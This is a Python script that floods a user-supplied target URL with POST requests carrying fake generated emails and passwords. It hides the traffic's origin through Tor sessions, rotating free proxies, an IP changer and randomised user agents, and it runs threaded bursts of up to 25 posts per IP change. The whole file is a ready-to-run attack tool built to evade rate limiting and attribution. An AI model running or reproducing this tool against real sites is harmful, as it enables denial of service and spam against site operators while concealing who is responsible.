import requests
import threading
import time
import sys
import random
import names
import string
from Assets.emailHosts import weighted_email_domains
from ip_changer import whats_my_ip, initialize_tornet, create_tor_session, start_ip_changer
from fp.fp import FreeProxy
from faker import Faker

# Fake information generator from many different languages to disguise requests
fake = Faker(['it_IT', 'en_US', 'ja_JP', 'fr_FR', 'de_DE', 'es_ES'])

def func_fetch_user_agents(url): # Fetches user agents from the URL and returns a list of user agents
    try:
        response = requests.get(url)
        if response.status_code == 200:
            user_agents = response.text.splitlines()
            return user_agents
        else:
            print(f"Failed to fetch user agents from {url}")
            return []
    except requests.RequestException as e:
        print(f"Error fetching user agents from {url}: {e}")
        return []

def func_get_user_agents(): # Fetches user agents from the URLs and returns a list of user agents
    urls = [
        'https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-android.txt',
        'https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-desktop.txt',
        'https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-ios.txt',
        'https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-linux.txt',
        'https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-macos.txt'
    ]
    user_agents = []
    for url in urls:
        user_agents.extend(func_fetch_user_agents(url))
    return user_agents

def func_get_random_user_agent(user_agents): # Returns a random user agent from the list
    return random.choice(user_agents)

def generate_proxy():
    return FreeProxy(rand=True).get()

get_proxy = generate_proxy()
proxy = {"http": get_proxy, "https": get_proxy}
    
def func_get_public_ip(): # Fetches the public IP address of the machine
    try:
        response = requests.get('https://icanhazip.com', proxies=proxy, headers={'User-Agent': func_get_random_user_agent(user_agents)})
        if response.status_code == 200:
            return response.text.strip()
        else:
            sys.exit(1)
            return None
    except requests.RequestException as e:
        print(f"Error fetching public IP: {e}")
        return None

def name_gen():  # Generates a random name for the email
    return fake.user_name()

def generate_random_email():
    name = name_gen()
    NumberOrNo=random.choice(["Number", "No"])
     
    # Calculate cumulative weights
    cumulative_weights = []
    total_weight = 0
    for domain, weight in weighted_email_domains:
        total_weight += weight
        cumulative_weights.append((domain, total_weight))
    
    # Select domain based on cumulative weights
    random_number = random.randint(1, total_weight)
    for domain, cumulative_weight in cumulative_weights:
        if random_number <= cumulative_weight:
            selected_domain = domain
            break
    
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + selected_domain
    else:
        return name + selected_domain

def generate_random_password():
    return fake.password() 

def func_attack(urlu, email, password, session, num_posts_per_ip_change): # Sends a POST request to the target URL with the email and password
    url = urlu
    data = {'ai': email, 'namep': password}
    
    try:
        current_ip = whats_my_ip()
        if num_posts_per_ip_change == 1:
            new_ip = whats_my_ip()
            while new_ip == current_ip:
                time.sleep(1)
                new_ip = whats_my_ip()
            current_ip = new_ip

        get_agents = func_get_random_user_agent(user_agents)
        headers = {'User-Agent': get_agents}
        get_proxy = generate_proxy()
        proxy = {"http": get_proxy, "https": get_proxy}
        response = session.post(url, data=data, proxies=proxy, headers=headers)
        print(f"Email: {random_email}, Password: {random_password}, Status Code: {response.status_code}, headers: {user_agents}, proxy: {proxy}")

        if num_posts_per_ip_change == 2:
            time.sleep(random.randint(5, 120))  # Random delay between 5 seconds and 2 minutes
        time.sleep(1)  # General delay to allow IP change

    except requests.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":

    url = input("Enter the URL of the target you want to flood: ")

    user_agents = func_get_user_agents()
    if not user_agents:
        print("Unable to retrieve user agents. Using default user agents.")
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:109.0) Gecko/20100101 Firefox/113.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/95.0.0.0",
            # Add more user agents as needed
        ]
    
    initialize_tornet() # Initialize Tor environment
    
    while True:
        try:
            choice = int(input("Choose an option:\n1. Send 1 post per IP change\n2. Send 25 posts per IP change\n3. Send posts at random intervals between 5 seconds and 2 minutes\nEnter your choice: "))
            if choice not in [1, 2, 3]:
                print("Invalid choice. Please enter 1, 2, or 3.")
                continue
            break
        except ValueError:
            print("Invalid input. Please enter a number.")
            
    ip_changer_thread = threading.Thread(target=start_ip_changer, daemon=True)
    ip_changer_thread.start()
    
    public_ip = func_get_public_ip() # Fetch public IP address
    if public_ip:
        print(f"Your public IP address is: {public_ip}")
    else:
        print("Unable to retrieve public IP address.")
        sys.exit(1)

    cycle_count = 0
    max_cycles = 5

    while cycle_count < max_cycles: # Run 5 cycles
        # Generate random email and password
        random_email = generate_random_email()
        random_password = generate_random_password()

        # Send request
        session = create_tor_session()

        if choice == 1:
            posting_thread = threading.Thread(target=func_attack, args=(url, random_email, random_password, session, 1), daemon=True)
            posting_thread.start()
        elif choice == 2:
            threads = [threading.Thread(target=func_attack, args=(url, random_email, random_password, session, 0), daemon=True) for _ in range(25)]
            for t in threads:
                t.start()
        elif choice == 3:
            posting_thread = threading.Thread(target=func_attack, args=(url, random_email, random_password, session, 2), daemon=True)
            posting_thread.start()

        time.sleep(1)
        cycle_count += 1

    print("Finished 5 cycles. Restarting ...")
    sys.exit(0)